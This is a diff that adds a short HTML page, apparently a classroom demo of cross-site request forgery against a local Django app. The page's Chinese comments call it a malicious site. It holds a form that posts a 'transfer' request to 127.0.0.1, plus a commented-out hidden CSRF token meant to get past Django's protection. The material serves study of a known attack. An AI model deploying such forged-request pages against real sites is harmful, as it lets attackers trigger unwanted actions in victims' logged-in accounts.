@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>恶意网站</title>
+</head>
+<body>
+    恶意网站
+    <hr>
+    <!-- 使用 python -m http.server 9000 命令开启此网页 -->
+    <!-- 攻击网页不能以本地文件的形式打开，这样是file协议而不是http协议，像app2发送下面请求时，浏览器不会发送127.0.0.1的cookie -->
+    <form method="post" action="http://127.0.0.1:8000/app2/check_request/">
+        <!-- 手动添加csrfmiddlewaretoken，使得可以通过django自带的防csrf机制 -->
+        <!-- <input type="hidden" name="csrfmiddlewaretoken" value="TsUPMr36Va8gCqeiPsK97wF2ulZpzn8YMlLmauMmJaiR0Inwcu8EChLGNH98Kc9T"> -->
+        <input type="submit" value="转账">
+    </form>
+</body>
+</html>
